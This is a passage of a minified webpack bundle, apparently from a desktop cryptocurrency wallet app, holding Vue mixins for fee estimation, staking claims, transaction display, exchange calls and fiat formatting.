            s.__esModule && (s = s.default), "string" == typeof s && (s = [
                [t.i, s, ""]
            ]), s.locals && (t.exports = s.locals);
            (0, i(49).default)("fe41bd00", s, !0, {})
        },
        4199: function (t, e, i) {
            (t.exports = i(46)(!1)).push([t.i, "\n.coin__plug[data-v-3eb5d77e]{display:flex;justify-content:center;align-items:center;flex-direction:column;gap:24px;margin-top:30vh\n}\n.coin__plug .icon[data-v-3eb5d77e]{font-size:60px;background:linear-gradient(180deg, #F8D175 0%, #F4C148 100%)\n}\n.coin__plug .text[data-v-3eb5d77e]{max-width:530px;font-size:16px;font-weight:400;line-height:24px;letter-spacing:0.15px\n}\n", ""])
        },
        5: function (t, e, i) {
            "use strict";
            i.d(e, "a", (function () {
                return s
            })), i.d(e, "b", (function () {
                return a.a
            })), i.d(e, "f", (function () {
                return o
            })), i.d(e, "g", (function () {
                return c
            })), i.d(e, "i", (function () {
                return d
            })), i.d(e, "t", (function () {
                return h
            })), i.d(e, "k", (function () {
                return u
            })), i.d(e, "j", (function () {
                return p
            })), i.d(e, "n", (function () {
                return f
            })), i.d(e, "q", (function () {
                return b
            })), i.d(e, "c", (function () {
                return w
            })), i.d(e, "s", (function () {
                return T
            })), i.d(e, "h", (function () {
                return y
            })), i.d(e, "m", (function () {
                return C
            })), i.d(e, "d", (function () {
                return x
            })), i.d(e, "l", (function () {
                return _
            })), i.d(e, "e", (function () {
                return k
            })), i.d(e, "r", (function () {
                return $
            })), i.d(e, "p", (function () {
                return E
            })), i.d(e, "o", (function () {
                return A
            }));
            var s = {
                    methods: {
                        saveWallets() {
                            this.$bus.$emit("save::wallets");
                            try {
                                this.$addresses.set(this.$wallets)
                            } catch (t) {
                                console.error(t)
                            }
                        }
                    }
                },
                a = i(607),
                n = i(20),
                o = {
                    methods: {
                        async clearAllTables() {
                            const t = n.e.tables.map(t => "rates" !== t.name && t.clear()).filter(Boolean);
                            return Promise.all(t)
                        }
                    }
                },
                r = i(9),
                c = {
                    computed: {
                        actionBuy: () => r.a,
                        actionClaim: () => r.b,
                        actionExchange: () => r.c,
                        actionSend: () => r.d,
                        actionStake: () => r.e,
                        actionUnstake: () => r.f,
                        actionVote: () => r.g,
                        actionWithdraw: () => r.h
                    },
                    methods: {
                        getCoinDisabilityReason(t) {
                            return r.o.getMessage(this.coin.ticker, t)
                        },
                        isCoinDisabled(t) {
                            return t.some(t => !r.o.isAllowed(this.coin.ticker, t))
                        }
                    }
                };
            const l = 1e9;
            var d = {
                    data: () => ({
                        satPerByte: null,
                        utxos: [],
                        defaultGasPrice: null,
                        defaultGasLimit: null,
                        minGasLimit: "21000",
                        customGas: [],
                        fee: {
                            ticker: "",
                            fee: ""
                        },
                        maxFeeForTRC20: 0
                    }),
                    computed: {
                        defaultSatPerByte() {
                            try {
                                const t = this.parent.getFeePerByte();
                                return t && String(t)
                            } catch {
                                return "1"
                            }
                        },
                        feeTicker() {
                            return ["VET", "VTHO"].includes(this.coin.ticker) ? "VTHO" : ["NEO", "GAS"].includes(this.coin.ticker) ? "GAS" : ["ONT", "ONG"].includes(this.coin.ticker) && "BSC" !== this.coin.parent ? "ONG" : this.coin.getFeeTicker ? this.coin.getFeeTicker() : this.coin.parent
                        },
                        fees() {
                            var t;
                            return (null === (t = this.fee) || void 0 === t ? void 0 : t.fee) || 0
                        }
                    },
                    methods: {
                        setMaxFeeForTRC20() {
                            var t, e;
                            this.maxFeeForTRC20 = null === (t = this.parent) || void 0 === t || null === (e = t.feeData) || void 0 === e ? void 0 : e.feeTRC20
                        },
                        async getUtxos() {
                            try {
                                return await this.parent.getUnspentOutputs()
                            } catch {
                                return []
                            }
                        },
                        setFee(t) {
                            this.fee.fee = t
                        },
                        setCustomSatoshi(t) {
                            this.satPerByte = t
                        },
                        setCustomGas(t) {
                            this.customGas = t
                        },
                        async getFee(t = 1, e) {
                            var i, s;
                            const a = new Set(["BSC", "ETH", "LUNC", "LUNA", "THETA"]);
                            [this.coin.ticker, this.coin.parent].some(t => a.has(t)) || (this.utxos = await this.getUtxos());
                            const n = this.coin instanceof r.D;
                            let o = null;
                            const c = new Set(["AVAX", "BSC", "MATIC"]),
                                d = new Set([...c, "ETH", "LUNC", "LUNA"]);
                            if (this.isCustomFeeSupported && d.has(this.coin.parent) || c.has(this.coin.parent)) {
                                var h, u;
                                const t = await this.parent.getGasPrice(!1, !0);
                                o = "ETH" === this.coin.parent && (null === (h = this.coin) || void 0 === h || null === (u = h.gasPriceConfig) || void 0 === u ? void 0 : u.fast) * l / 10 || t;
                                const e = await this.parent.getGasPrice(!0, n);
                                this.nodeGasPrice = (Number(e) / l).toString().replace(/\.[0-9]+[1-9]/, ""), this.defaultGasPrice = (Number(o) / l).toString().replace(/\.[0-9]+[1-9]/, ""), n || ["LUNC", "LUNA"].includes(this.coin.ticker) ? (this.minGasLimit = ["LUNC", "LUNA"].includes(this.coin.parent) ? await this.parent.estimateGas("1", "", this.coin.contract, this.coin.denom) : await this.parent.estimateGas("1", "", this.coin.contract), this.defaultGasLimit = String(this.minGasLimit)) : this.defaultGasLimit = String(this.coin.gasLimit)
                            }
                            const p = Number(t) && t || Number(this.inputs.amount) > 0 && this.inputs.amount,
                                m = p ? this.coin.toMinimalUnit(p) : null,
                                g = "ADA" === this.coin.ticker ? {
                                    utxos: this.utxos,
                                    address: e,
                                    sendAmount: m
                                } : "ZIL" !== this.coin.parent && "VTHO" !== this.coin.ticker ? {
                                    feePerByte: this.satoshiPerByte || this.satPerByte || this.defaultSatPerByte,
                                    userGasPrice: (null === (i = this.customGas) || void 0 === i ? void 0 : i[0]) || o,
                                    utxos: this.utxos,
                                    gasLimit: (null === (s = this.customGas) || void 0 === s ? void 0 : s[1]) || this.defaultGasLimit,
                                    address: this.inputs.address,
                                    sendAmount: m,
                                    isToken: n,
                                    contract: this.coin.contract,
                                    denom: this.coin.denom,
                                    custom: this.inputs.custom
                                } : null,
                                v = "VTHO" === this.coin.ticker ? this.coin : this.coin.getFeeTicker ? this.$wallets.getWallet(this.coin.getFeeTicker()) : this.parent,
                                f = await (g ? v.getFee(g) : v.getFee());
                            ["NEO3", "GAS3"].includes(this.coin.id) ? this.setFee(f) : ["VET"].includes(this.coin.id) ? this.setFee(this.coin.toCurrencyUnit(f, 20)) : "TRX" === this.parent.ticker && "TRX" !== this.coin.ticker ? this.setFee(String(this.maxFeeForTRC20)) : this.setFee(n || "ONT" === this.coin.ticker && "BSC" !== this.coin.parent ? this.parent.toCurrencyUnit(f) : this.coin.toCurrencyUnit(f)), this.fee.ticker = this.feeTicker
                        }
                    }
                },
                h = {
                    methods: {
                        $iconClass(t) {
                            const e = "object" == typeof t && t.id && this.$wallets.getWallet(t.id) || this.$wallets.findWallet(t.ticker || t) || t,
                                i = "string" == typeof e ? t : e.contract || e.id,
                                s = String("icon-" + i).toLowerCase(),
                                a = "icon-" + (null == i ? void 0 : i.toUpperCase());
                            if (e instanceof r.D) switch (e.parent) {
                            case "ETH":
                                return "icon-ethTokenDefault " + s;
                            case "BNB":
                                return "icon-bnbTokenDefault " + s;
                            case "AVAX":
                                return `icon-AVAX icon-${e.ticker} ${s}`;
                            case "BSC":
                                return "icon-bscTokenDefault " + s;
                            case "LUNC":
                                return `icon-LUNC icon-${e.ticker} ${s}`;
                            case "MATIC":
                                return `icon-MATIC icon-${e.ticker} ${s}`
                            }
                            return `icon-default ${a} ${s}`
                        }
                    }
                };
            var u = {
                    data: () => ({
                        page: 0
                    }),
                    methods: {
                        handleScrollEnd(t) {
                            const {
                                scrollHeight: e,
                                offsetHeight: i,
                                scrollTop: s
                            } = t.target;
                            e - (i + s) > 150 || this.isListEnded || (this.page += 1)
                        }
                    }
                },
                p = {
                    data: () => ({
                        openedIds: []
                    }),
                    methods: {
                        removeOpenedId(t) {
                            const e = this.openedIds.filter(e => t !== e);
                            this.openedIds = e
                        },
                        addOpenedId(t) {
                            this.openedIds.push(t)
                        }
                    }
                },
                m = i(26),
                g = i.n(m),
                v = i(10);
            var f = {
                props: {
                    staking: {
                        type: Object,
                        default: () => ({})
                    }
                },
                data: () => ({
                    settings: {
                        rate: "",
                        tickerToSend: "",
                        receiveTicker: "",
                        tickerToReceive: ""
                    },
                    errorMessage: "",
                    txId: "",
                    isClaiming: !1,
                    isError: !1,
                    isSuccess: !1,
                    showHelpPopup: !1,
                    fetchCoinInfoTimeout: null,
                    successClaimedAmount: 0
                }),
                computed: {
                    ...Object(v.c)(["excludedCurrenciesExchange"]),
                    dailyReward() {
                        let t = new g.a(this.staking.balance).dividedBy(this.settings.rate).toString();
                        return t = Number(t) > 1 ? Number(t).toFixed(4) : Number(t).toFixed(6), Number(t) || 0
                    },
                    trxBalance() {
                        const {
                            balances: {
                                total: t
                            }
                        } = this.$wallets.getWallet("TRX", "atomic");
                        return Number(t) || 0
                    },
                    coin() {
                        return this.$wallets.findWallet(this.staking.ticker, "atomic")
                    },
                    parent() {
                        return this.$wallets.getWallet(this.coin.parent)
                    },
                    unclaimed() {
                        const {
                            balances: t
                        } = this.coin;
                        return t && t.rewards || 0
                    },
                    unbonding() {
                        const {
                            balances: t
                        } = this.coin;
                        return t && t.unbonding || 0
                    },
                    receiveBalance() {
                        const t = this.settings.receiveTicker,
                            e = this.$wallets.findWallet(t).divisibleBalance;
                        return this.fixedBalance(e) || 0
                    },
                    isPossibleToBuy() {
                        return !this.excludedCurrenciesExchange.includes(this.coin.ticker)
                    }
                },
                mounted() {
                    this.fetchCoinInfo(), this.$bus.$on("close-staking-exchange-popup", this.closeHandler)
                },
                beforeDestroy() {
                    this.$bus.$off("close-staking-exchange-popup", this.closeHandler), clearTimeout(this.fetchCoinInfoTimeout)
                },
                methods: {
                    fetchCoinInfo() {
                        clearTimeout(this.fetchCoinInfoTimeout), this.fetchCoinInfoTimeout = setTimeout(async () => {
                            "SOL" === this.staking.ticker ? await this.coin.getInfo({
                                ignoreCache: !0
                            }) : "AWC-986" === this.staking.ticker ? await this.parent.getInfo() : await this.coin.getInfo()
                        }, 5e3)
                    },
                    closeHandler() {
                        this.$emit("closePopup")
                    },
                    goBuy(t) {
                        let e = this.coin;
                        t && (e = this.$wallets.getWallet(t)), this.$router.push({
                            path: "/exchange",
                            query: {
                                receive: e
                            }
                        })
                    },
                    fixedBalance(t) {
                        const e = Number(t);
                        return e > 1 ? e.toFixed(4) : e.toFixed(6)
                    },
                    backToStakeTable() {
                        this.backToStake(), this.$emit("closePopup")
                    },
                    backToStake() {
                        this.isSuccess = !1, this.isError = !1
                    },
                    async claim() {
                        const {
                            isValid: t,
                            message: e
                        } = this.validate();
                        if (!t) return void(this.errorMessage = e);
                        this.isClaiming = !0;
                        const i = await this.coin.claim().catch(t => {
                            this.errorMessage = t && t.message.replace("Error: ", "")
                        });
                        i ? (this.successClaimedAmount = this.unclaimed, this.isSuccess = !0, this.txId = i.txid) : this.isError = !0, this.isClaiming = !1
                    },
                    formatAmount: t => new Intl.NumberFormat("en-US").format(t)
                }
            };
            var b = {
                props: {
                    tx: {
                        type: Object,
                        default: () => {}
                    }
                },
                computed: {
                    address() {
                        return this.tx.otherSideAddress && "..." !== this.tx.otherSideAddress ? this.tx.direction ? this.parentAddress : this.tx.otherSideAddress : this.parentAddress
                    },
                    amountUnit() {
                        return "vote" !== this.tx.txType ? this.tx.ticker : "1" === this.tx.amount ? "Vote" : "Votes"
                    },
                    description() {
                        return this.isOperation ? {
                            freeze: "Freeze",
                            reward: "Claim rewards",
                            claim: "Claim",
                            withdraw: "Withdraw",
                            stake: "Stake",
                            unstake: "Unstake",
                            vote: "Vote"
                        } [this.tx.txType] : this.targetAddress
                    },
                    isOperation() {
                        return ["freeze", "reward", "stake", "unstake", "vote", "withdraw", "claim"].includes(this.tx.txType)
                    },
                    isPending() {
                        const t = ["ETH", "XMR"].includes(this.parent.ticker),
                            e = Number(this.tx.confirmations) < this.pendingConfirmations[this.parent.ticker];
                        return t && e
                    },
                    isResendButton() {
                        if ("ETH" !== this.parent.ticker || !this.isPending || this.tx.direction) return !1;
                        const t = Number(this.tx.timestamp) + 6e4 * this.parent.resendTimeout;
                        return Date.now() >= t
                    },
                    parent() {
                        const {
                            parent: t
                        } = this.$wallets.getWallet(this.tx.walletid);
                        return this.$wallets.getWallet(t)
                    },
                    parentAddress() {
                        const {
                            address: t
                        } = this.parent;
                        return t
                    },
                    placeholderPaymentId() {
                        return this.getPlaceholderPaymentId(this.tx.ticker, this.parent.ticker)
                    },
                    targetAddress() {
                        return this.tx.direction ? this.tx.otherSideAddress : this.address
                    }
                },
                data: () => ({
                    isCopyAddress: !0,
                    pendingConfirmations: {
                        ETH: 1,
                        XMR: 10
                    },
                    showCopy: !1,
                    windowWidth: null
                }),
                methods: {
                    formatAddress(t) {
                        if (!t) return "";
                        const [e, i] = this.maxAddressSize();
                        return t.length <= e ? t : t.substr(0, i) + "..." + t.substr(-i)
                    },
                    open() {
                        const {
                            explorer: t
                        } = this.parent;
                        this.$electron.shell.openExternal(`${t.webUrl}${this.tx.txid}`)
                    },
                    copyToClipboard(t, e = !0) {
                        if (e) this.$electron.clipboard.writeText(t);
                        else {
                            const {
                                explorer: e = null
                            } = this.parent, i = `${e.webUrl}${t}`;
                            this.$electron.clipboard.writeText(i)
                        }
                        this.showCopy = !0, this.isCopyAddress = e, setTimeout(() => {
                            this.showCopy = !1
                        }, 1e3)
                    }
                }
            };
            var w = {
                data: () => ({
                    awcBalance: 0,
                    estimatedCashback: "0"
                }),
                computed: {
                    ...Object(v.c)(["coinRate", "fiatRate"]),
                    isMember() {
                        var t;
                        return null === (t = this.$cashback.currentLevel(this.awcBalance)) || void 0 === t ? void 0 : t.isMember
                    },
                    isCashbackAvaliable() {
                        return this.isMember && !isNaN(this.estimatedCashback) && Number(this.estimatedCashback) >= 0
                    }
                },
                watch: {
                    async cashbackParams() {
                        await this.calculateCashback()
                    }
                },
                async mounted() {
                    await this.updateAwcBalance(), await this.calculateCashback()
                },
                methods: {
                    async updateAwcBalance() {
                        const t = this.$wallets.getWallet("BNB");
                        await t.getInfo({
                            onlyCoin: !0
                        });
                        const e = this.$wallets.findWallet("AWC-986"),
                            i = localStorage.getItem(e.id + "-balance"),
                            {
                                divisibleBalance: s = null
                            } = e;
                        this.awcBalance = Number(s || i || 0)
                    },
                    async calculateCashback() {
                        let t = 0;
                        this.cashbackParams && this.cashbackParams.amount && Number(this.cashbackParams.amount > 0) && this.isCashbackAvaliable && (t = await this.$cashback.calculateCashback(this.cashbackParams.amount, this.cashbackParams.wallet, this.awcBalance)), this.estimatedCashback = t || 0
                    }
                }
            };
            var T = {
                data: () => ({
                    showCoinInfoPopup: !1,
                    activeCoin: null,
                    showSendCoinPopup: !1,
                    showReceiveCoinPopup: !1,
                    showStakingPopup: !1
                }),
                computed: {
                    ...Object(v.c)(["fiatRate", "coinRate", "walletsState", "walletWizard", "mainChartData", "balanceSummary"]),
                    walletsForTable() {
                        return this.filterWallets.map(t => {
                            const {
                                divisibleBalance: e,
                                ticker: i,
                                name: s,
                                id: a,
                                contract: n,
                                parent: o
                            } = t, r = this.getChartData(i), {
                                rate: c,
                                change: l = 0,
                                marketCap: d = 0
                            } = this.coinRate(this.fiatRate, this.$wallets.getWallet(a)), h = this.getCoinBalance(e, i, a), u = this.fixedBalance(h), p = this.$options.filters.formatFiat(h * c, this.fiatRate, 1), m = new g.a(p).dividedBy(this.valueForOnePercent()).toString(), v = this.$options.filters.formatFiat(c, this.fiatRate), f = {
                                icon: "" + this.$iconClass(t),
                                fiatRate: this.fiatRate,
                                portfolioToShow: Number(m || 0).toFixed(2),
                                id: a,
                                name: s,
                                price: v,
                                value: p,
                                parent: o,
                                change: l,
                                ticker: i,
                                balance: h,
                                contract: n,
                                portfolio: m,
                                marketCap: d,
                                chartData: r,
                                fixedBalance: u
                            };
                            return this.updateCoinBalance({
                                balance: h,
                                id: a
                            }), f
                        })
                    }
                },
                methods: {
                    ...Object(v.b)(["updateCoinBalance"]),
                    valueForOnePercent() {
                        const t = localStorage.getItem(this.fiatRate + "-fiatBalance"),
                            e = this.balanceSummary(this.fiatRate);
                        return Number(new g.a(e || t).dividedBy(100).toString()) || 1
                    },
                    getCoinBalance(t, e, i) {
                        t && localStorage.setItem(i + "-balance", t);
                        const s = localStorage.getItem(i + "-balance");
                        return Number(t || s || 0)
                    },
                    fixedBalance: t => Number(t > 1 ? t.toFixed(4) : t.toFixed(6)),
                    closeCoinInfoPopup() {
                        this.showCoinInfoPopup = !this.showCoinInfoPopup
                    },
                    closeSendCoinPopup() {
                        this.showSendCoinPopup = !this.showSendCoinPopup
                    },
                    closeReceiveCoinPopup() {
                        this.showReceiveCoinPopup = !this.showReceiveCoinPopup
                    },
                    closeStakingPopup() {
                        this.showStakingPopup = !this.showStakingPopup
                    },
                    toggleSendCoinPopup(t, e = null) {
                        this.resendParams = e, this.activeCoin = t, this.closeSendCoinPopup(), this.$nextTick()
                    },
                    toggleReceiveCoinPopup(t) {
                        this.activeCoin = t, this.closeReceiveCoinPopup(), this.$nextTick()
                    },
                    toggleStakingPopup(t) {
                        this.activeCoin = t, this.closeStakingPopup(!0)
                    },
                    editToken(t) {
                        this.closeCoinInfoPopup(), this.$emit("editToken", t)
                    },
                    toggleCoinInfoPopup({
                        id: t,
                        alias: e
                    }) {
                        const i = this.$wallets.getWallet(t, e);
                        "" === i.address && "EOS" === i.id ? this.toggleWizard(i) : (this.activeCoin = i, this.closeCoinInfoPopup())
                    },
                    getChartData(t) {
                        const e = this.mainChartData(t, this.fiatRate, this.$chartData.mainChartEndPoint);
                        return e && e.length > 0 ? e.map(({
                            close: t
                        }) => t) : []
                    }
                }
            };
            var y = {
                computed: {
                    ...Object(v.c)(["isMocked"]),
                    currentService() {
                        return this.$exchanges.getService(this.$exchanges.getCurrentServiceName())
                    }
                },
                data: () => ({
                    exchangeRate: null
                }),
                methods: {
                    cancelRequests() {
                        this.currentService.cancelAnyRequests()
                    },
                    getCurrencies() {
                        return this.currentService.getCurrencies()
                    },
                    async getFilteredCurrencies() {
                        return this.$exchanges.getAvailableWalletIdCollection(this.currenciesExchange, this.$wallets)
                    },
                    getStatus(t) {
                        return this.currentService.getStatus(t)
                    },
                    getRate(t, e, i) {
                        return this.currentService.getExchangeAmount(t, e, i)
                    },
                    getMinimalAmount(t, e) {
                        return this.currentService.getMinAndMaxAmount(t, e)
                    },
                    validateExchangeTx(t) {
                        return this.currentService.validateExchangeTx(t)
                    },
                    async refundTransaction(t) {
                        if (this.isMocked) {
                            return new Promise(t => setTimeout(() => {
                                t({
                                    result: !0
                                })
                            }, 3e3))
                        }
                        const {
                            id: e,
                            refundAddress: i
                        } = t;
                        return await this.$exchanges[this.defaultService].exchangeRefund(e, i)
                    },
                    async exchangeContinue(t) {
                        if (this.isMocked) {
                            return new Promise(t => setTimeout(() => {
                                t({
                                    result: !0
                                })
                            }, 3e3))
                        }
                        return await this.$exchanges[this.defaultService].exchangeContinue(t.id)
                    },
                    async createExchangeTransaction(t, e, i, s, a, n, o, r) {
                        try {
                            const c = await this.currentService.createTransaction(t, e, i, s, a, o, r);
                            if (!c) throw new Error("Can't create exchange transaction, service unavailable");
                            const l = this.$exchanges.getPreorder(t, e, a, n);
                            return this.$exchanges.postCashbackExchangeTx(c, this.$wallets.hash, a, r, s, l, this.$exchanges.getCurrentServiceName()), this.$exchanges.addExchangeTransactionToDb(c, this.$wallets.hash, a, r, s, l), c
                        } catch (t) {
                            console.error(t)
                        }
                    },
                    async sendTransaction(t, e, i, s = null, a, n = null) {
                        return this.$exchanges.sendTransaction(t, this.$wallets.getWallet(t.parent), e, i, s, a, n)
                    }
                }
            };
            var C = {
                    computed: {
                        ...Object(v.c)(["stakingSettings"]),
                        feeReserveCoef() {
                            const t = this.coin.feeData && this.coin.feeData.reserveCoef || 3;
                            return "Stake" === this.sendType ? t : 1
                        }
                    },
                    methods: {
                        setStakingValidator() {
                            const t = this.stakingSettings.find(({
                                    ticker: t
                                }) => this.coin.ticker === t).defaultValidator || this.stakingSettings[0].name || "",
                                e = localStorage.getItem(`selected::${this.coin.ticker}::validator`) || t;
                            this.selectedStakingValidator = this.$staking.getStakingInterface(this.coin.ticker).validators.find(({
                                address: t,
                                name: i
                            }) => t === e || i === e).name
                        },
                        getPlaceholderPaymentId: (t, e) => ["XLM", "KIN", "EOS"].includes(t) ? "Memo.ID" : ["XEM"].includes(e) ? "Message" : ["BNB", "ATOM", "HBAR", "BAND", "LUNC", "LUNA"].includes(e) ? "Memo" : "XMR" === t ? "Payment ID" : "Destination tag",
                        backToWallets() {
                            this.clearInputs(), this.$emit("closePopup")
                        }
                    }
                },
                x = {
                    methods: {
                        createChartData(t) {
                            const e = t.length,
                                i = [];
                            for (let s = 0; s < e; s += 1) {
                                const e = Number(t[s]),
                                    a = s,
                                    n = {
                                        x: isNaN(a) ? 0 : a,
                                        y: isNaN(e) ? 0 : e
                                    };
                                i.push(n)
                            }
                            return i
                        }
                    }
                },
                _ = {
                    props: {
                        coin: {
                            type: Object,
                            default: null
                        }
                    },
                    computed: {
                        ...Object(v.c)(["fiatRate", "stakingRate"]),
                        feeWallet() {
                            return this.$wallets.findWallet(this.fee.ticker)
                        },
                        parent() {
                            return this.$wallets.getWallet(this.coin.parent)
                        },
                        ticker() {
                            return "AWC-986" === this.coin.ticker ? "AWC" : this.coin.ticker
                        },
                        stakingDelegatingMessage() {
                            var t, e;
                            const i = "AWC-986" === this.coin.ticker ? "AWC" : this.coin.ticker;
                            return null === (t = this.$texts.staking[i]) || void 0 === t || null === (e = t.hints) || void 0 === e ? void 0 : e.delegating
                        }
                    },
                    methods: {
                        buyCoin() {
                            this.buy(this.coin)
                        },
                        saveSuccessStaking(t = null, e = null) {
                            const i = t || this.inputs && this.inputs.amount || "",
                                s = e || this.inputs && this.inputs.address || "",
                                a = {
                                    currency: this.coin.ticker,
                                    atomicId: this.$wallets.hash,
                                    hash: this.txid,
                                    amount: i,
                                    orderId: null,
                                    providerAddress: s,
                                    provider: this.stakingValidator && this.stakingValidator.name || "",
                                    yearlyIncome: this.stakingProfit || "",
                                    walletVersion: `${this.$platformVersion.getPlatform()} ${this.$platformVersion.getVersion()}`,
                                    platform: this.$platformVersion.getVersion(),
                                    payoutAddress: this.coin.address,
                                    bnbAddress: this.$wallets.getWallet("BNB").address
                                };
                            this.$staking.saveSuccessStaking(a)
                        }
                    }
                };
            var k = {
                methods: {
                    hasRate({
                        id: t
                    }) {
                        if (!this.$rates || !this.$rates.data) return !1;
                        const e = this.$rates.data[t];
                        return e && e[this.fiatRate] && !0
                    },
                    roundFiat(t, e = 6) {
                        if (/^\./.test(t)) return t;
                        let i = t.toString().match(/(?<!0\.[0-9]{0,6})0{1,6}(?=[0-9]{1,6})/g),
                            s = this.numberToFixed(t.toString()),
                            a = s.match(/\.$|\.0{1,6}$|(?<=\.[0-9]{1,6})0{1,6}$|(?<=[0-9]{1,6}\.[0-9]{1,6})0{1,6}$/g);
                        return a = null === a ? "" : a[0], i = null === i || 0 !== parseInt(t[0]) ? "" : i[0], s = Math.ceil((1e8 * s).toFixed(e)) / 1e8, i + s.toString() + a
                    },
                    numberToFixed(t, e = 6) {
                        if (!t) return "";
                        let i = t;
                        const [s, a] = i.toString().split(".");
                        return a && a.length >= e && (i = `${s}.${a.slice(0,e)}`), i.toString()
                    },
                    balanceInFiat(t) {
                        const e = this.$wallets.getWallet(t);
                        if (!e) return "0.00";
                        const i = this.coinRate(this.fiatRate, e).rate * e.divisibleBalance;
                        return i ? "BTC" === this.fiatRate ? i.toFixed(8) : i.toFixed(2) : "0.00"
                    },
                    getValueFiat(t, {
                        id: e
                    }, i = !1) {
                        if (!t) return 0;
                        const s = this.$rates.data[e];
                        if (!s) return 0;
                        const a = new g.a(t).multipliedBy(s[this.fiatRate] && s[this.fiatRate].rate || 0).toFixed(8);
                        return "BTC" === this.fiatRate ? Number(a).toFixed(8) : a > 1 ? parseFloat(this.roundFiat(a)).toFixed(2) : a < 1e-6 ? a : i ? parseFloat(this.roundFiat(a)).toFixed(4) : this.roundFiat(a)
                    },
                    formatNumber(t, {
                        locale: e = "en-US",
                        currency: i,
                        minDecimals: s,
                        maxDecimals: a
                    }) {
                        const n = {
                            minimumFractionDigits: s,
                            maximumFractionDigits: a
                        };
                        return i && Object.assign(n, {
                            currency: i,
                            style: "currency"
                        }), new Intl.NumberFormat(e, n).format(+t || 0)
                    },
                    calculateFiatValue(t, {
                        id: e
                    }) {
                        const {
                            rate: i = 0
                        } = this.coinRate(this.fiatRate, this.$wallets.getWallet(e)), s = new g.a(+t || 0).multipliedBy(i);
                        return this.formatFinanceValue(s)
                    },
                    formatFinanceValue(t, e) {
                        const i = +t || 0;
                        let s;
                        return s = "BTC" === this.fiatRate ? 8 : i < 1e-6 || i > 1 ? 2 : 6, this.formatNumber(i, {
                            minDecimals: 2,
                            maxDecimals: s,
                            currency: e
                        })
                    },
                    getFinanceValue(t) {
                        const e = new g.a(+t || 0);
                        let i;
                        return i = "BTC" === this.fiatRate ? 8 : e < 1e-6 || e > 1 ? 2 : 6, new Intl.NumberFormat("en-US", {
                            minimumFractionDigits: 2,
                            maximumFractionDigits: i
                        }).format(e)
                    }
                },
                computed: {
                    ...Object(v.c)(["fiatRate", "coinRate"])
                }
            };
            let S = [];
            var $ = {
                    methods: {
                        ...Object(v.b)(["setWalletsState", "updateWalletState"]),
                        data: () => ({
                            walletsAcc: [],
                            accTimeout: null
                        }),
                        setWalletsHandler() {
                            this.setWalletsState(Array.from(this.$wallets))
                        },
                        assumeWallets(t) {
                            clearTimeout(this.accTimeout);
                            const e = this.$wallets.getWallet(t);
                            if (e && (S.push(e), this.accTimeout = setTimeout(() => {
                                    const t = S.map(t => this.$wallets.getWallet(t.id)).filter(Boolean);
                                    this.setWalletsState(t)
                                }, 3e3), S.length > 15)) {
                                const t = [...S.map(t => this.$wallets.getWallet(t.id)).filter(Boolean)];
                                this.setWalletsState(t), S = []
                            }
                        },
                        updateWalletsHandler(t) {
                            this.assumeWallets(t)
                        },
                        async socketConfirmedTxHandler({
                            id: t
                        }) {
                            const e = t,
                                i = this.$wallets.getWallet(e),
                                s = this.$wallets.getWallet(i.parent);
                            if (i instanceof r.D && ["ETH", "LUNC"].includes(i.parent)) {
                                s.getInfo({
                                    isToken: !0,
                                    contract: i.contract,
                                    ticker: i.ticker
                                });
                                const t = await s.getTransactions();
                                this.$wallets.transactions(t)
                            } else s.getInfo()
                        }
                    },
                    computed: {
                        ...Object(v.c)(["walletsState"])
                    },
                    mounted() {
                        this.$bus.$on("save::wallets", this.setWalletsHandler), this.$bus.$on("update::fiat-balance", this.setWalletsHandler), this.$bus.$on("update::coin-list", this.setWalletsHandler), this.$bus.$on("update::balances", this.setWalletsHandler), this.$bus.$on("update::balance", this.updateWalletsHandler), this.$bus.$on("socket::tx::confirmed", this.socketConfirmedTxHandler)
                    },
                    beforeDestroy() {
                        clearTimeout(this.accTimeout), this.$bus.$off("save::wallets", this.setWalletsHandler), this.$bus.$off("update::fiat-balance", this.setWalletsHandler), this.$bus.$off("update::coin-list", this.setWalletsHandler), this.$bus.$off("update::balances", this.setWalletsHandler), this.$bus.$off("update::balance", this.updateWalletsHandler), this.$bus.$off("socket::tx::confirmed", this.socketConfirmedTxHandler)
                    }
                },
                E = {
                    methods: {
                        writeMail(t, e) {
                            const i = `mailto:support@atomicwallet.io?${""===e?"":`subject=${e}&`}body=${`%0A%0A%0A------------------------------------------------%0A${""===t?"":t+"%0A"}Atomic ID: ${this.$wallets.hash}%0AAtomic Wallet Version: ${this.$platformVersion.getVersion()}%0A`}`;
                            this.$electron.shell.openExternal(i)
                        }
                    }
                };
            var A = {
                data: () => ({
                    activeCoin: null,
                    showStakingPopup: !1
                }),
                methods: {
                    closeStakingPopup(t = !1) {
                        if (this.showStakingPopup = !this.showStakingPopup, t) {
                            const t = this.activeCoin.ticker;
                            if ("TRX" === t) {
                                const e = this.stakingSettings.find(e => e.ticker === t),
                                    i = this.$wallets.find(e => e.ticker === t),
                                    s = localStorage.getItem(i.id + "-balance"),
                                    a = this.coinRate(this.fiatRate, i).rate,
                                    n = Number(i.divisibleBalance) || Number(s);
                                let o = "0";
                                n && (o = n > 1 ? n.toFixed(4) : n.toFixed(6), o = Number(o).toString());
                                const r = Number(o * a);
                                let c = "BTC" !== this.fiatRate ? r.toFixed(2) : r;
                                c = Number(c).toString(), this.activeStaking = {
                                    icon: this.$iconClass(i),
                                    name: e.name,
                                    reward: e.reward,
                                    ticker: t,
                                    balance: o,
                                    fiatBalance: c,
                                    tags: e.tags
                                }
                            }
                        }
                    },
                    changeActiveCoin({
                        id: t
                    }) {
                        this.activeCoin = this.$wallets.getWallet(t)
                    }
                }
            }
        },
        607: function (t, e, i) {
            "use strict";
            e.a = {
                methods: {
                    buy(t) {
                        this.$buy.isAvailable(t) ? this.$router.push("/simplex/USD/" + this.$buy.getAvailableWallet(t).id) : this.$router.push("/exchange/BTC/" + t.id)
                    }
                }
            }
        }
    }
]);